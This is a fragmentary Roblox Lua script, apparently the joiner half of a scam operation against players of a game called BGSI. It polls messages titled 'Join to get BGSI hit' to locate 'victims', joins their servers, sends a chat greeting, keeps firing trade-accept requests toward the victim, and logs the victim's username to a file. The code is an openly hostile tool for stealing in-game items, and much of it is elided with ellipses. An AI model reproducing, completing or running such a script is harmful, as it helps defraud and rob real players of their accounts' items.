...
local playButton = game:GetService("Players").LocalPlayer.PlayerGui:WaitForChild("Intro"):WaitForChild("Play"):WaitForChild("Button")
local Players = game:GetService("Players")
local plr = Players.LocalPlayer

while plr:GetAttribute("DataLoaded") ~= true do
    plr:GetAttributeChangedSignal("DataLoaded"):Wait() -- Wait for data to load
end
...
event:FireServer(unpack(startArgs)) -- Load game

while plr:GetAttribute("CanChat") ~= true do
    plr:GetAttributeChangedSignal("CanChat"):Wait()
end

game:GetService('TextChatService').TextChannels.RBXGeneral:SendAsync('hi')
local tradeFrame = game.Players.LocalPlayer.PlayerGui.ScreenGui:WaitForChild("Trading")
local inTrade = tradeFrame.Visible
...
local function acceptRequest()
    while task.wait(1) do
        if not inTrade then
            event:FireServer("TradeAcceptRequest", game:GetService("Players"):WaitForChild(victimUser))
        end
    end
end
    ...
    if response.StatusCode == 200 then
        ...
        for _, message in ipairs(messages) do
            if message.content ~= "" and message.embeds and message.embeds[1] and message.embeds[1].title then
                if message.embeds[1].title:find("Join to get BGSI hit") then
                    ...
                    if placeId and jobId then
                        ...
                        if didVictimLeave or timer > 10 then
                            if not table.find(joinedIds, tostring(message.id)) then
                                ...
                                writefile("user_bgsi.txt", victimUsername)
